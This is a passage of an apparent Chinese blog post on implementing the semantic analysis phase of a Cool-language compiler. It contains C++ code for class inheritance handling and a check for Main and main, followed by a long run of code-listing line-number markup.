== attr_map-&gt;<span class="built_in">end</span>()) &#123;</span><br><span class="line">          attr_map-&gt;<span class="built_in">insert</span>(std::<span class="built_in">pair</span>&lt;Symbol, attr_class*&gt;(iter.first, iter.second)); </span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Method_type *method_map = method_environment-&gt;<span class="built_in">find</span>(self)-&gt;second;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 可能继承不存在的类</span></span><br><span class="line"><span class="comment">     * 这里需要判断，避免崩溃</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(method_environment-&gt;<span class="built_in">find</span>(inherit) != method_environment-&gt;<span class="built_in">end</span>()) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;iter : *method_environment-&gt;<span class="built_in">find</span>(inherit)-&gt;second) &#123;</span><br><span class="line">        <span class="keyword">if</span>(method_map-&gt;<span class="built_in">find</span>(iter.first) == method_map-&gt;<span class="built_in">end</span>()) &#123;</span><br><span class="line">          method_map-&gt;<span class="built_in">insert</span>(std::<span class="built_in">pair</span>&lt;Symbol, method_class*&gt;(iter.first, iter.second)); </span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">enter_scope</span><span class="params">(Symbol class_)</span> </span>&#123;</span><br><span class="line">    self = class_;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(attr_environment-&gt;<span class="built_in">find</span>(self) == attr_environment-&gt;<span class="built_in">end</span>()) &#123; attr_environment-&gt;<span class="built_in">insert</span>(std::<span class="built_in">pair</span>&lt;Symbol, Attr_type*&gt;(self, <span class="keyword">new</span> <span class="built_in">Attr_type</span>())); &#125;</span><br><span class="line">    <span class="keyword">if</span>(method_environment-&gt;<span class="built_in">find</span>(self) == method_environment-&gt;<span class="built_in">end</span>()) &#123; method_environment-&gt;<span class="built_in">insert</span>(std::<span class="built_in">pair</span>&lt;Symbol, Method_type*&gt;(self, <span class="keyword">new</span> <span class="built_in">Method_type</span>())); &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">exit_scope</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">assert_self</span>();</span><br><span class="line">    self = <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Symbol <span class="title">probe</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> self; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 检查是否存在Main类和main方法</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">check_mains</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 即将类的方法和属性，添加到env中</span></span><br><span class="line"><span class="comment"> * 从而为之后检查提供信息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">method_class::add_to_classtable</span><span class="params">(ClassTable *class_table)</span> </span>&#123; class_table-&gt;<span class="built_in">add</span>(<span class="keyword">this</span>); &#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">attr_class::add_to_classtable</span><span class="params">(ClassTable *class_table)</span> </span>&#123; class_table-&gt;<span class="built_in">add</span>(<span class="keyword">this</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 遍历两遍inherits(保存所有的类)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 第一遍添加当前类的属性和方法</span></span><br><span class="line"><span class="comment"> * 第二遍将父类的feature添加到子类中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ClassTable::install_features</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;iter : inherits) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">enter_scope</span>(iter.first);</span><br><span class="line">        Features features = symbol_to_class[iter.first]-&gt;<span class="built_in">get_features</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = features-&gt;<span class="built_in">first</span>(); features-&gt;<span class="built_in">more</span>(i); i = features-&gt;<span class="built_in">next</span>(i)) &#123; features-&gt;<span class="built_in">nth</span>(i)-&gt;<span class="built_in">add_to_classtable</span>(<span class="keyword">this</span>); &#125;</span><br><span class="line">        <span class="built_in">exit_scope</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::unordered_set&lt;Symbol&gt; hasSolved;</span><br><span class="line">    hasSolved.<span class="built_in">insert</span>(Object);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 使用dfs，解决多层递归问题</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;iter : inherits) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hasSolved.<span class="built_in">find</span>(iter.first) != hasSolved.<span class="built_in">end</span>()) &#123; <span class="keyword">continue</span>; &#125;</span><br><span class="line"></span><br><span class="line">        std::stack&lt;Symbol&gt; stack;</span><br><span class="line">        Symbol s = iter.first;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//dfs解决多层递归</span></span><br><span class="line">        <span class="keyword">while</span>(hasSolved.<span class="built_in">find</span>(s) == hasSolved.<span class="built_in">end</span>()) &#123;</span><br><span class="line">            stack.<span class="built_in">push</span>(s);</span><br><span class="line">            s = inherits[s];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!stack.<span class="built_in">empty</span>()) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">enter_scope</span>(stack.<span class="built_in">top</span>());</span><br><span class="line">            <span class="built_in">add</span>(s);</span><br><span class="line">            <span class="built_in">exit_scope</span>();</span><br><span class="line"></span><br><span class="line">            s = stack.<span class="built_in">top</span>();</span><br><span class="line">            stack.<span class="built_in">pop</span>();</span><br><span class="line">            hasSolved.<span class="built_in">insert</span>(s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 检查程序中类是否存在Main类和main方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ClassTable::check_mains</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查Main类</span></span><br><span class="line">    <span class="keyword">if</span>(inherits.<span class="built_in">find</span>(Main) == inherits.<span class="built_in">end</span>()) &#123;</span><br><span class="line">        <span class="built_in">semant_error</span>() &lt;&lt; <span class="string">&quot;Class Main is not defined.&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查main方法</span></span><br><span class="line">    Method_type *method_map = method_environment-&gt;<span class="built_in">at</span>(Main);</span><br><span class="line">    <span class="keyword">if</span>(method_map-&gt;<span class="built_in">find</span>(main_meth) == method_map-&gt;<span class="built_in">end</span>()) &#123;</span><br><span class="line">        <span class="built_in">semant_error</span>(symbol_to_class[Main]) &lt;&lt; <span class="string">&quot;No &#x27;main&#x27; method in class Main.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ClassTable::<span class="built_in">ClassTable</span>(Classes classes) : <span class="built_in">semant_errors</span>(<span class="number">0</span>) , <span class="built_in">error_stream</span>(cerr) &#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化类的属性和方法 */</span></span><br><span class="line">  <span class="built_in">install_features</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 检查是否存在Main类和main方法 */</span></span><br><span class="line">  <span class="built_in">check_mains</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="解析接口实现"><a href="#解析接口实现" class="headerlink" title="解析接口实现"></a>解析接口实现</h3><p>  解析接口实现，主要也包括两部分</p><ol><li>检验方法体添加的变量合法性</li><li><p>检验方法体定义的变量关系(表达式)的合法性</p><p>实际上，这部分与<strong>实验文档</strong>的关联非常紧密——一开始没有认真分析实验文档，导致与标准的语义分析器的输出结果天差地别。</p><p>总的来说，其实现逻辑比较简单,考虑到<strong>Cool</strong>的方法体结构，可以使用自顶向下的遍历模式<br><img src="cool方法体结构.png" alt="cool方法体结构"></p><p>如果在<strong>feature</strong>、<strong>formal</strong>和<strong>expr</strong>节点中都统一定义接口<code>Symbol check_type(ClassTable *class_table)</code><br>表示检查和设置当前节点的合法性，并且返回该节点对应的最终类型，则实现<strong>解析接口实现</strong>的逻辑就非常简单——从<strong>feature</strong>节点开始，对于其<strong>属性文法</strong>中的相关属性递归调用<strong>check_type</strong>，并且根据其返回信息，验证该节点中的属性间的合法性</p><p>具体每一类节点的合法性规则定义在了<strong>实验指南</strong>中，一定要认真阅读，否则之后测试时会很痛苦，之后就是具体实现<strong>实验指南</strong>中的每一个类型规则即可。<br>相关的代码如下所示</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span 